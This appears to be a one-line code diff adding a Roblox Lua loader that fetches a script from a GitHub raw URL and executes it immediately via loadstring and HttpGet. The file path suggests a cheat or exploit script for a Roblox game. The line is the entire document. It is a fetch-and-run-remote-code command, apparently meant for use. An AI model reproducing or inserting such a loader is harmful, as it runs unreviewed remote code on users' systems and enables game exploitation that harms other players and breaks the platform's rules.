@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/runaways-beta-spam1-fzkgxw62jl3f0l.lua"))()
